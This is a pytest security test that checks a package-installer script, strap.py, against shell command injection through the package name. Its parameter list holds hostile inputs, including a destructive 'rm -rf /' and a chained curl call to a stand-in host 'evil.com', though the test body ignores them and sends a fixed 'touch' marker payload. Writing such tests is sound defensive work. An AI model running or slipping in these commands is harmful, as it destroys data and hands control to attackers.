import pytest
import subprocess
import os
import tempfile


@pytest.mark.parametrize("payload", [
    "; rm -rf /",           # exact exploit: shell metachar injection
    "$(whoami)",            # command substitution attack
    "valid-package-name",  # valid input (no metacharacters)
    "pkg&& curl evil.com", # chained command injection
])
def test_package_name_not_executed_as_shell_command(payload, tmp_path):
    """Invariant: User-supplied package names must not allow arbitrary shell command execution."""
    # We run strap.py in a sandboxed subprocess with a marker command.
    # If shell injection occurs, the marker file will be created.
    marker = tmp_path / "pwned"
    # Craft a payload that would create the marker file if shell injection works
    injection_payload = f"; touch {marker} #"
    
    script_path = os.path.join(os.path.dirname(__file__), "rootfs", "strap.py")
    
    # Run the script with the injection payload as input, expect it to fail
    # gracefully (e.g., network error) but NOT execute the injected command.
    # We provide the injection payload followed by a newline for the input() call.
    # The script may fail due to missing network/files, but the marker must not exist.
    result = subprocess.run(
        ["python3", script_path],
        input=injection_payload + "\n",
        capture_output=True,
        text=True,
        timeout=10,
        env={**os.environ, "HOME": str(tmp_path)},
    )
    
    # The critical security invariant: the injected command must NOT have executed
    assert not marker.exists(), (
        f"Shell injection succeeded! Marker file created with payload: {injection_payload!r}"
    )